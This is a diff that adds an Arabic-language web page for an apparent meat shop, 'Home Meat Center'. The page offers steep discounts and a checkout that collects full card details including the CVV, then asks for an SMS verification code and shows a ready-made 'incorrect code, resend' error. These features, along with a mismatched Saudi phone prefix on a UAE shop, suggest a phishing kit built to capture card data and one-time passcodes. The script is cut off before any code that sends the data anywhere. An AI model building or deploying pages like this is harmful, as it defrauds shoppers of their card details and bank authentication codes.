@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز بيت اللحوم - Home Meat Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
+        body { background: #f0f2f5; direction: rtl; }
+        
+        .header { background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 15px 20px; position: sticky; top: 0; z-index: 100; }
+        .header-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+        
+        .logo { display: flex; align-items: center; gap: 15px; }
+        .logo-image { width: 55px; height: 55px; background: linear-gradient(135deg, #d32f2f, #b71c1c); border-radius: 14px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(211,47,47,0.3); }
+        .logo-image i { font-size: 30px; color: white; }
+        .logo-text h1 { font-size: 22px; font-weight: 800; color: #1a1a2e; }
+        .logo-text p { font-size: 11px; color: #d32f2f; font-weight: 600; }
+        .logo-sub { font-size: 10px; color: #888; margin-top: 3px; }
+        
+        .cart-icon { position: relative; cursor: pointer; background: #d32f2f; padding: 10px 15px; border-radius: 25px; transition: transform 0.3s; }
+        .cart-icon:hover { transform: scale(1.05); }
+        .cart-icon i { color: white; }
+        .cart-count { position: absolute; top: -8px; right: -8px; background: #ff9800; color: white; border-radius: 50%; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; }
+        
+        .hero-section {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            margin: 20px 20px 0 20px;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+        .hero-container {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 40px;
+            gap: 30px;
+        }
+        .hero-text {
+            flex: 1;
+            color: white;
+        }
+        .hero-badge {
+            background: rgba(255,255,255,0.15);
+            display: inline-block;
+            padding: 6px 18px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            backdrop-filter: blur(5px);
+        }
+        .hero-text h2 {
+            font-size: 35px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+        .hero-text h2 span {
+            color: #d32f2f;
+        }
+        .hero-text p {
+            font-size: 16px;
+            opacity: 0.9;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            max-width: 500px;
+        }
+        .hero-stats {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .hero-stat .number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #d32f2f;
+        }
+        .hero-stat .label {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        .hero-image {
+            flex: 1;
+            min-width: 250px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .hero-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            background: white;
+            padding: 10px;
+        }
+        
+        .sections-nav { background: white; border-bottom: 1px solid #eee; position: sticky; top: 80px; z-index: 99; }
+        .sections-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: center; gap: 10px; padding: 15px 20px; flex-wrap: wrap; }
+        .section-nav-btn { padding: 10px 25px; border: none; background: transparent; border-radius: 30px; font-weight: 600; font-size: 15px; cursor: pointer; transition: all 0.3s; color: #666; }
+        .section-nav-btn.active { background: #d32f2f; color: white; }
+        
+        .section-content { max-width: 1200px; margin: 40px auto; padding: 0 20px; display: none; }
+        .section-content.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .section-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; color: #1a1a2e; border-right: 4px solid #d32f2f; padding-right: 15px; }
+        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
+        
+        .product-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 20px rgba(0,0,0,0.05); transition: all 0.3s; cursor: pointer; }
+        .product-card:hover { transform: translateY(-5px); box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
+        .product-img { width: 100%; height: 200px; object-fit: cover; background: #f5f5f5; }
+        .product-image-wrapper { position: relative; }
+        .discount-badge { position: absolute; top: 12px; right: 12px; background: #ff9800; color: white; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .product-info { padding: 18px; }
+        .product-title { font-size: 17px; font-weight: 700; margin-bottom: 6px; color: #1a1a2e; }
+        .product-desc { font-size: 12px; color: #888; margin-bottom: 12px; line-height: 1.4; }
+        .product-price { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 15px; flex-wrap: wrap; gap: 8px; }
+        .old-price { color: #aaa; text-decoration: line-through; font-size: 13px; }
+        .new-price { color: #d32f2f; font-size: 20px; font-weight: 700; }
+        .add-to-cart { width: 100%; background: #d32f2f; color: white; border: none; padding: 10px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-size: 14px; }
+        .add-to-cart:hover { background: #b71c1c; transform: scale(1.02); }
+        
+        .cart-sidebar { position: fixed; top: 0; left: -400px; width: 380px; height: 100%; background: white; box-shadow: -5px 0 30px rgba(0,0,0,0.15); z-index: 1000; transition: left 0.3s ease; display: flex; flex-direction: column; }
+        .cart-sidebar.open { left: 0; }
+        .cart-header { background: #1a1a2e; color: white; padding: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .close-cart { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
+        .cart-items { flex: 1; overflow-y: auto; padding: 20px; }
+        .cart-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #eee; }
+        .cart-item-actions { display: flex; gap: 8px; }
+        .cart-item-actions button { background: #f0f0f0; border: none; width: 28px; height: 28px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .cart-footer { padding: 20px; border-top: 1px solid #eee; background: #fafafa; }
+        .cart-total { display: flex; justify-content: space-between; font-size: 18px; font-weight: 700; margin-bottom: 15px; }
+        .checkout-btn { width: 100%; background: #d32f2f; color: white; border: none; padding: 14px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        
+        .delivery-page, .payment-page, .verify-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1100; display: none; justify-content: center; align-items: center; overflow-y: auto; }
+        .delivery-page.active, .payment-page.active, .verify-page.active { display: flex; }
+        .delivery-container, .payment-container, .verify-container { background: white; width: 90%; max-width: 520px; border-radius: 32px; overflow: hidden; animation: slideUp 0.35s ease; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .page-header { background: linear-gradient(135deg, #d32f2f, #b71c1c); padding: 30px 25px 25px; text-align: center; }
+        .page-header i { font-size: 50px; color: white; margin-bottom: 10px; }
+        .page-header h2 { font-size: 24px; font-weight: 700; color: white; }
+        .page-header p { font-size: 13px; color: rgba(255,255,255,0.8); margin-top: 5px; }
+        
+        .page-body { padding: 28px; }
+        
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; font-size: 13px; }
+        .form-group label i { margin-left: 8px; color: #d32f2f; width: 18px; }
+        .form-group input, .form-group select { width: 100%; padding: 14px 16px; border: 1.5px solid #e8e8e8; border-radius: 14px; font-size: 15px; transition: all 0.2s; background: #fafafa; direction: ltr; text-align: left; }
+        .form-group input:focus { outline: none; border-color: #d32f2f; background: white; box-shadow: 0 0 0 3px rgba(211,47,47,0.1); }
+        
+        .order-summary { background: #f8f9fc; border-radius: 18px; padding: 18px; margin-bottom: 25px; }
+        .order-summary h3 { margin-bottom: 12px; color: #1a1a2e; font-size: 16px; }
+        .summary-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+        .summary-total { display: flex; justify-content: space-between; padding: 12px 0 5px; font-weight: 700; font-size: 18px; color: #d32f2f; }
+        
+        .payment-options-modern { display: flex; gap: 15px; margin: 25px 0; }
+        .payment-option-modern { flex: 1; text-align: center; padding: 14px; border: 2px solid #e8e8e8; border-radius: 16px; cursor: pointer; transition: all 0.2s; background: white; }
+        .payment-option-modern.selected { border-color: #d32f2f; background: #fff5f5; transform: translateY(-2px); }
+        .payment-option-modern i { font-size: 28px; margin-bottom: 8px; display: block; }
+        .payment-option-modern span { font-weight: 600; font-size: 14px; }
+        .payment-option-modern small { font-size: 10px; color: #888; display: block; margin-top: 4px; }
+        
+        .card-input-wrapper { position: relative; width: 100%; }
+        .card-input-wrapper input { width: 100%; padding: 14px 70px 14px 16px !important; border: 1.5px solid #e8e8e8; border-radius: 14px; font-size: 15px; background: #fafafa; direction: ltr; text-align: left; }
+        .card-input-wrapper input:focus { outline: none; border-color: #d32f2f; background: white; box-shadow: 0 0 0 3px rgba(211,47,47,0.1); }
+        .card-type-badge { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); display: flex; align-items: center; gap: 8px; pointer-events: none; }
+        
+        .visa-badge { display: flex; align-items: center; gap: 5px; background: #fff; padding: 4px 8px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .visa-text { font-family: monospace; font-size: 16px; font-weight: 700; color: #1a1f71; }
+        .mastercard-badge { display: flex; align-items: center; gap: 0px; background: #fff; padding: 4px 8px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .mc-red-small { width: 22px; height: 22px; background: #eb001b; border-radius: 50%; }
+        .mc-yellow-small { width: 22px; height: 22px; background: #f79e1b; border-radius: 50%; margin-right: -8px; }
+        .amex-badge { background: #fff; padding: 4px 8px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .amex-text { font-family: monospace; font-size: 14px; font-weight: 700; color: #2d6cc9; }
+        .default-card-icon { background: #fff; padding: 4px 8px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); color: #888; font-size: 18px; }
+        
+        .valid-feedback { color: #4caf50; font-size: 11px; margin-top: 5px; display: none; }
+        .invalid-feedback { color: #f44336; font-size: 11px; margin-top: 5px; display: none; }
+        
+        .code-inputs { display: flex; justify-content: center; gap: 12px; margin: 30px 0; direction: ltr; }
+        .code-input { width: 55px; height: 65px; text-align: center; font-size: 28px; font-weight: 700; border: 2px solid #e8e8e8; border-radius: 16px; background: #fafafa; transition: all 0.2s; direction: ltr; line-height: 1; display: flex; align-items: center; justify-content: center; }
+        .code-input:focus { outline: none; border-color: #d32f2f; background: white; box-shadow: 0 0 0 3px rgba(211,47,47,0.1); }
+        .resend-link { color: #d32f2f; cursor: pointer; font-weight: 600; text-decoration: none; }
+        .resend-link.disabled { color: #aaa; cursor: not-allowed; }
+        .timer-text { color: #888; font-size: 13px; margin-right: 10px; }
+        
+        .error-alert {
+            background: linear-gradient(135deg, #ffebee, #ffcdd2);
+            border: 2px solid #f44336;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            animation: shake 0.5s ease;
+            display: none;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        .error-alert i { font-size: 40px; color: #f44336; margin-bottom: 10px; }
+        .error-alert h4 { color: #f44336; margin-bottom: 8px; }
+        .error-alert p { color: #666; font-size: 13px; margin-bottom: 15px; }
+        .resend-error-btn { background: #ff9800; color: white; border: none; padding: 10px 25px; border-radius: 25px; cursor: pointer; font-weight: 600; transition: all 0.3s; }
+        .resend-error-btn:hover { background: #f57c00; transform: scale(1.05); }
+        
+        .next-btn, .confirm-btn { width: 100%; background: linear-gradient(135deg, #d32f2f, #b71c1c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: all 0.2s; }
+        .next-btn:hover, .confirm-btn:hover { transform: scale(1.02); box-shadow: 0 8px 20px rgba(211,47,47,0.3); }
+        
+        .close-page { position: absolute; top: 15px; right: 20px; background: rgba(0,0,0,0.1); border: none; width: 36px; height: 36px; border-radius: 50%; font-size: 18px; cursor: pointer; transition: all 0.2s; color: white; }
+        .close-page:hover { background: rgba(0,0,0,0.3); transform: scale(1.1); }
+        
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 2000; display: none; justify-content: center; align-items: center; flex-direction: column; }
+        .loader { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #d32f2f; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 999; display: none; }
+        .overlay.active { display: block; }
+        
+        .sacrifice-img { height: 260px !important; object-fit: cover !important; }
+        .extra-large-img { height: 280px !important; object-fit: cover !important; }
+        
+        .footer { background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; padding: 30px 20px; margin-top: 50px; text-align: center; }
+        .footer-logo { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .footer-logo-icon { width: 45px; height: 45px; background: linear-gradient(135deg, #d32f2f, #b71c1c); border-radius: 10px; display: flex; align-items: center; justify-content: center; }
+        .footer-logo-icon i { font-size: 24px; color: white; }
+        .footer-logo-text h4 { font-size: 18px; font-weight: 700; color: white; }
+        .footer-logo-text p { font-size: 10px; color: #ffcdd2; }
+        .footer-text { font-size: 12px; opacity: 0.7; margin-top: 15px; }
+        
+        @media (max-width: 768px) { .cart-sidebar { width: 100%; left: -100%; } .section-nav-btn { padding: 8px 18px; font-size: 13px; } .code-input { width: 45px; height: 55px; font-size: 24px; } .hero-container { flex-direction: column; text-align: center; padding: 25px; } .hero-text p { max-width: 100%; } .hero-stats { justify-content: center; } }
+        
+        input[type="tel"], input[type="text"] { direction: ltr; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loading"><div class="loader"></div><p style="margin-top: 12px; color: #666;">جاري معالجة طلبك...</p></div>
+
+<header class="header">
+    <div class="header-content">
+        <div class="logo">
+            <div class="logo-image"><i class="fas fa-drumstick-bite"></i></div>
+            <div class="logo-text">
+                <h1>مركز بيت اللحوم</h1>
+                <p>HOME MEAT CENTER</p>
+                <div class="logo-sub">من مزرعتنا إلى مائدتك، طازجة وآمنة دائماً</div>
+            </div>
+        </div>
+        <div class="cart-icon" onclick="toggleCart()"><i class="fas fa-shopping-cart"></i><span class="cart-count" id="cartCount">0</span></div>
+    </div>
+</header>
+
+<div class="hero-section">
+    <div class="hero-container">
+        <div class="hero-text">
+            <div class="hero-badge"><i class="fas fa-map-marker-alt"></i> الإمارات | AL BARARI</div>
+            <h2>مركز <span>بيت اللحوم</span></h2>
+            <h2 style="font-size: 28px; margin-top: -10px;">HOME MEAT CENTER</h2>
+            <p>من مزرعتنا إلى مائدتك، طازجة وآمنة دائماً. نقدم لكم أجود أنواع اللحوم الطازجة والأضاحي بأفضل الأسعار.</p>
+            <div class="hero-stats">
+                <div class="hero-stat"><div class="number">+5000</div><div class="label">عميل سعيد</div></div>
+                <div class="hero-stat"><div class="number">+10</div><div class="label">سنوات خبرة</div></div>
+                <div class="hero-stat"><div class="number">100%</div><div class="label">طازج وآمن</div></div>
+            </div>
+        </div>
+        <div class="hero-image">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhhN8Iuj_F624-QHT0Pkukv3IShUlN6iM8guSAB-w4Tk0aI_LtQyDGr2hj&s=10" alt="مركز بيت اللحوم">
+        </div>
+    </div>
+</div>
+
+<nav class="sections-nav">
+    <div class="sections-container">
+        <button class="section-nav-btn active" data-section="meat">🥩 اللحوم</button>
+        <button class="section-nav-btn" data-section="chicken">🐔 الدواجن</button>
+        <button class="section-nav-btn" data-section="fish">🐟 الأسماك</button>
+        <button class="section-nav-btn" data-section="sacrifice">🐑 الأضاحي</button>
+    </div>
+</nav>
+
+<div class="section-content active" id="section-meat"><div class="section-title">🥩 أجود أنواع اللحوم الطازجة</div><div class="products-grid" id="meatGrid"></div></div>
+<div class="section-content" id="section-chicken"><div class="section-title">🐔 دواجن طازجة يومياً</div><div class="products-grid" id="chickenGrid"></div></div>
+<div class="section-content" id="section-fish"><div class="section-title">🐟 أسماك طازجة من البحر</div><div class="products-grid" id="fishGrid"></div></div>
+<div class="section-content" id="section-sacrifice"><div class="section-title">🐑 أضاحي العيد - بأسعار مخفضة</div><div class="products-grid" id="sacrificeGrid"></div></div>
+
+<div class="overlay" id="overlay" onclick="toggleCart()"></div>
+<div class="cart-sidebar" id="cartSidebar">
+    <div class="cart-header"><h3><i class="fas fa-shopping-bag"></i> سلة التسوق</h3><button class="close-cart" onclick="toggleCart()">✕</button></div>
+    <div class="cart-items" id="cartItems"><p style="text-align:center; color:#999; padding:30px;">سلة التسوق فارغة</p></div>
+    <div class="cart-footer"><div class="cart-total"><span>المجموع</span><span id="cartTotal">0.00</span></div><button class="checkout-btn" onclick="openDeliveryPage()">إتمام الشراء</button><p style="font-size:11px; color:#aaa; text-align:center; margin-top:10px;"><i class="fas fa-lock"></i> عملية دفع آمنة 100%</p></div>
+</div>
+
+<div class="delivery-page" id="deliveryPage">
+    <button class="close-page" onclick="closeDeliveryPage()">✕</button>
+    <div class="delivery-container">
+        <div class="page-header"><i class="fas fa-truck"></i><h2>معلومات التوصيل</h2><p>أدخل بياناتك لإتمام الطلب</p></div>
+        <div class="page-body">
+            <div class="order-summary" id="deliverySummary"><h3><i class="fas fa-receipt"></i> ملخص الطلب</h3><div id="deliverySummaryItems"></div><div class="summary-total"><span>الإجمالي</span><span id="deliverySummaryTotal">0.00</span></div></div>
+            <div class="form-group"><label><i class="fas fa-user"></i> الاسم الكامل</label><input type="text" id="fullName" placeholder="أدخل اسمك الكامل"></div>
+            <div class="form-group"><label><i class="fas fa-phone"></i> رقم الجوال</label><input type="tel" id="phone" placeholder="05XXXXXXXX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
+            <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> عنوان التوصيل</label><input type="text" id="address" placeholder="المدينة، الحي، الشارع"></div>
+            <div class="form-group"><label><i class="fas fa-calendar"></i> تاريخ الاستلام</label><input type="date" id="deliveryDate"></div>
+            <div class="form-group"><label><i class="fas fa-clock"></i> فترة الاستلام</label><select id="deliveryTime"><option>9:00 ص - 12:00 م</option><option>12:00 م - 3:00 م</option><option>3:00 م - 6:00 م</option><option>6:00 م - 9:00 م</option></select></div>
+            <button class="next-btn" onclick="validateAndGoToPayment()">التالي: الدفع <i class="fas fa-arrow-left"></i></button>
+        </div>
+    </div>
+</div>
+
+<div class="payment-page" id="paymentPage">
+    <button class="close-page" onclick="closePaymentPage()">✕</button>
+    <div class="payment-container">
+        <div style="background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 25px; text-align: center;">
+            <h3 style="color: white; font-size: 22px; font-weight: 700;"><i class="fas fa-credit-card"></i> إتمام الدفع</h3>
+        </div>
+        
+        <div class="page-body">
+            <div class="order-summary" id="paymentSummary"><h3><i class="fas fa-receipt"></i> ملخص الطلب</h3><div id="paymentSummaryItems"></div><div class="summary-total"><span>الإجمالي</span><span id="paymentSummaryTotal">0.00</span></div></div>
+            
+            <div class="payment-options-modern">
+                <div class="payment-option-modern selected" data-payment="full" onclick="selectPayment('full')"><i class="fas fa-credit-card"></i><span>دفع كامل</span><small>خصم 5% فوري</small></div>
+                <div class="payment-option-modern" data-payment="deposit" onclick="selectPayment('deposit')"><i class="fas fa-hand-holding-usd"></i><span>دفع 10 درهم</span><small>+ الباقي عند الاستلام</small></div>
+            </div>
+            
+            <div class="form-group"><label><i class="fas fa-user"></i> اسم صاحب البطاقة</label><input type="text" id="cardName" placeholder="AHMED ALI" oninput="this.value=this.value.toUpperCase().replace(/[^A-Z\s]/g, '')" onkeypress="return /[A-Za-z\s]/i.test(event.key)"></div>
+            
+            <div class="form-group"><label><i class="fas fa-credit-card"></i> رقم البطاقة</label>
+                <div class="card-input-wrapper">
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" oninput="formatCardNumber(this)">
+                    <div class="card-type-badge" id="cardTypeBadge">
+                        <div class="default-card-icon"><i class="far fa-credit-card"></i></div>
+                    </div>
+                </div>
+                <div id="cardNumberFeedback" class="invalid-feedback">رقم بطاقة غير صحيح</div>
+                <div id="cardNumberValid" class="valid-feedback">✓ رقم بطاقة صحيح</div>
+            </div>
+            
+            <div style="display: flex; gap: 15px;">
+                <div class="form-group" style="flex:1"><label><i class="fas fa-calendar"></i> تاريخ الانتهاء</label><input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" oninput="formatExpiry(this)" onkeydown="handleExpiryDelete(event, this)"><div id="expiryFeedback" class="invalid-feedback">تاريخ غير صالح</div></div>
+                <div class="form-group" style="flex:1"><label><i class="fas fa-lock"></i> رمز CVV</label><input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')"><div id="cvvFeedback" class="invalid-feedback">CVV 3 أرقام</div></div>
+            </div>
+            
+            <div id="depositInfo" style="background:#e8f5e9; padding:14px; border-radius:16px; margin-top:15px; text-align:center; font-size:13px; display:none;"><i class="fas fa-info-circle"></i> سيتم خصم 10 درهم فقط الآن، والمتبقي عند الاستلام</div>
+            <button class="confirm-btn" onclick="processPayment()"><i class="fas fa-check-circle"></i> تأكيد الدفع</button>
+        </div>
+    </div>
+</div>
+
+<div class="verify-page" id="verifyPage">
+    <button class="close-page" onclick="closeVerifyPage()">✕</button>
+    <div class="verify-container">
+        <div class="page-header"><i class="fas fa-shield-alt"></i><h2>تأكيد العملية</h2><p>أدخل رمز التحقق المرسل إلى هاتفك</p></div>
+        <div class="page-body" style="text-align: center;">
+            <p style="color: #666; margin-bottom: 10px;">تم إرسال الرمز إلى رقم الهاتف</p>
+            <p style="font-weight: 700; color: #d32f2f; margin-bottom: 20px;" id="verifyPhone">+966 5X XXX XXXX</p>
+            
+            <div class="error-alert" id="errorAlert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h4>⚠️ رمز غير صحيح</h4>
+                <p>الرمز الذي أدخلته غير صحيح. يرجى إعادة إرسال الرمز والمحاولة مرة أخرى.</p>
+                <button class="resend-error-btn" onclick="resendCodeFromError()"><i class="fas fa-paper-plane"></i> إعادة إرسال الرمز</button>
+            </div>
+            
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" class="code-input" maxlength="1" id="code1" oninput="moveToNext(this, 'code2')" onkeydown="handleBackspace(event, this, 'code1')" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" id="code2" oninput="moveToNext(this, 'code3')" onkeydown="handleBackspace(event, this, 'code1')" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" id="code3" oninput="moveToNext(this, 'code4')" onkeydown="handleBackspace(event, this, 'code2')" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" id="code4" oninput="moveToNext(this, 'code5')" onkeydown="handleBackspace(event, this, 'code3')" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" id="code5" oninput="moveToNext(this, 'code6')" onkeydown="handleBackspace(event, this, 'code4')" inputmode="numeric">
+                <input type="text" class="code-input" maxlength="1" id="code6" onkeydown="handleBackspace(event, this, 'code5')" inputmode="numeric">
+            </div>
+            
+            <p style="margin-top: 20px;">
+                لم يصلك الرمز؟
+                <a href="#" id="resendCodeLink" class="resend-link" onclick="resendCode(event)">إعادة الإرسال</a>
+                <span id="timerText" class="timer-text"></span>
+            </p>
+            
+            <button class="confirm-btn" onclick="verifyCode()">تأكيد الرمز</button>
+        </div>
+    </div>
+</div>
+
+<footer class="footer">
+    <div class="footer-logo">
+        <div class="footer-logo-icon"><i class="fas fa-drumstick-bite"></i></div>
+        <div class="footer-logo-text">
+            <h4>مركز بيت اللحوم</h4>
+            <p>HOME MEAT CENTER</p>
+        </div>
+    </div>
+    <div class="footer-text">من مزرعتنا إلى مائدتك، طازجة وآمنة دائماً</div>
+    <div class="footer-text" style="margin-top: 10px; font-size: 11px;">© 2025 جميع الحقوق محفوظة - الإمارات | AL BARARI</div>
+</footer>
+
+<script>
+    const products = {
+        meat: [
+            { id: 1, name: "لحم بقر طازج", imageUrl: "https://lh7-us.googleusercontent.com/9GeMt6I54hlLPCCu0HoR4aaVhs8i4l5xfVK8DL0yglwFJme1CvYRro630I2GY_MYrdwYFENF6IbWAlG-Yn3m-qpSIAvqpFCbDUi60opu2Np4OUgt6C2EMVs0Zoo3VTYWDafHXKx97AmaLNYfBpyDXyA", description: "لحم بقر درجة أولى - مقطع ستيك", price: 55, oldPrice: 85, weight: "1 كجم", discount: 35 },
+            { id: 2, name: "لحم عجل صغير", imageUrl: "https://foodzway.com/wp-content/uploads/2024/11/ribeye-wagyu-beef-premium-marbled-beef-for-steaks-and-grilling-%D9%84%D8%AD%D9%85-%D8%A8%D9%82%D8%B1%D9%8A-%D9%88%D8%A7%D8%AC%D9%8A%D9%88-%D8%B1%D9%8A%D8%A8-%D8%A2%D9%8A-%D8%B9%D8%A7%D9%84%D9%8A-%D8%A7%D9%84%D8%AC%D9%88%D8%AF%D8%A9.webp", description: "لحم عجل (بتلو) - طري جداً", price: 65, oldPrice: 100, weight: "1 كجم", discount: 35 },
+            { id: 3, name: "لحم غنم مفروم", imageUrl: "https://cdn.salla.sa/NNKNq/c6122fe2-3cc2-49e1-94b0-6a211c0f442e-1000x1000-oqxxB2PRkVIBJ9Zt0b5OrSLhpsx6brE1K6j2nfSt.jpg", description: "لحم غنم مفروم ناعم", price: 40, oldPrice: 60, weight: "1 كجم", discount: 33 }
+        ],
+        chicken: [
+            { id: 4, name: "دجاجة كاملة", imageUrl: "https://cdn.salla.sa/mnPyE/d678d875-9233-4daf-a214-3952f8e94cd0-1000x666.66666666667-FpHOAI5KEIf0O2nzxEn5fAujtbTHI9S4EDc1aIaB.jpg", description: "دجاجة كاملة - مبردة طازجة", price: 18, oldPrice: 28, weight: "1 كجم", discount: 36 },
+            { id: 5, name: "صدور دجاج", imageUrl: "https://asch-sa.com/wp-content/uploads/2016/05/fresh-chicken-breasts.jpg", description: "صدور دجاج منزوعة العظم", price: 22, oldPrice: 35, weight: "1 كجم", discount: 37 },
+            { id: 6, name: "أفخاذ دجاج", imageUrl: "https://palmyraorders.com/cdn/shop/files/fresh-chicken-legs-500g-shop-your-daily-fresh-products-free-delivery-1.jpg?v=1719837197&width=1000", description: "أفخاذ دجاج طازجة", price: 20, oldPrice: 32, weight: "1 كجم", discount: 38 },
+            { id: 7, name: "دجاج بلدي", imageUrl: "https://dokan.ps/wp-content/uploads/2023/05/1593949_main.jpg", description: "دجاج بلدي طبيعي 100%", price: 28, oldPrice: 42, weight: "1 كجم", discount: 33 }
+        ],
+        fish: [
+            { id: 8, name: "سمكة كاملة", imageUrl: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIUMSAMrueItolb7xTwjwZV9azs8W8moNrJlN8PeeqGetNlYDMgJWX4WFaEB92OCo5Xx3gtwcf_wPTtrNqKwqC-1g5Fur9k6qW-xeHGK1BmAEQJRxK83aPiWNTKA2hxYlpmDJkr0L5akAR/s1600/Screenshot_20190823-224254-removebg-preview.png", description: "سمكة كاملة من البحر", price: 30, oldPrice: 45, weight: "1 كجم", discount: 33 },
+            { id: 9, name: "ربيان طازج", imageUrl: "https://kitchen.sayidaty.net/uploads/node/shrimps-with-pepper.jpg", description: "ربيان جامبو - مقشر", price: 45, oldPrice: 70, weight: "1 كجم", discount: 36 },
+            { id: 10, name: "فيليه سمك", imageUrl: "https://www.lfco.ly/wp-content/uploads/2023/12/filet-min.jpg", description: "فيليه سمك خالي من العظم", price: 38, oldPrice: 60, weight: "1 كجم", discount: 37 },
+            { id: 11, name: "سلمون نرويجي", imageUrl: "https://cdn.salla.sa/mKyPW/5c314f7e-352b-4202-9876-b037ec32017b-500x500-wVDuQHXuPDjWVfKq0z4SxIpXEHrpk5aEWWeDSKAP.png", description: "سلمون نرويجي - شرائح", price: 55, oldPrice: 85, weight: "1 كجم", discount: 35 }
+        ],
+        sacrifice: [
+            { id: 12, name: "خروف نعيمي كامل", imageUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNeof-IIeRiXBnw8bIxU_-Qmhi0cYjk1hdzBhV-0VnZ1flsYKWZbI8qI3o&s=10", description: "خروف نعيمي طازج - لحم طري وشهي", price: 750, oldPrice: 1100, weight: "22-25 كجم", discount: 32, big: true },
+            { id: 13, name: "خروف بلدي", imageUrl: "https://media.zid.store/fd7b2439-b6f0-4f15-aaf1-b4d58bf4c733/41aa172a-2562-414f-8cc0-a284cb8e0996.jpg", description: "خروف بلدي أصيل - لحم طري وشهي", price: 680, oldPrice: 1000, weight: "20-24 كجم", discount: 32, big: true },
